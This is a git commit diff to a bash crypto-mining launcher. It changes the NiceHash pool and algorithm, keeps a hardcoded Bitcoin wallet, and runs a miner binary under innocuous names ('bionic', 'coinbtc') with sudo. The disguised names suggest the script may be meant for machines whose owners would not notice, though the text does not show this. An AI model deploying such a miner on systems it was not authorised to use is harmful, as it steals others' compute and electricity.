64107b85ad4b223e29dec9dc82897d7ec4e24621
andryhar1204 <75998721+andryhar1204@users.noreply.github.com>
2021-08-24 19:40:03 +0700

    Update nch.sh

--- nch.sh
+++ nch.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-POOL=stratum+tcp://autolykos.eu-west.nicehash.com:3390
+POOL=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
 
 WALLET=3P8DtYzCrvhuj448RHdAMSmdLnsKCDBsK8
 
@@ -8,5 +8,4 @@ WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BTCNICEHASH
 
 cd "$(dirname "$0")"
 
-chmod +x ./bionic && sudo ./bionic --algo AUTOLYKOS2 --pool $POOL --user $WALLET.$WORKER $@ --ethstratum ETHPROXY
-
+chmod +x ./coinbtc && sudo ./coinbtc --algo ETHASH --pool $POOL --user $WALLET.$WORKER $@ --ethstratum ETHPROXY
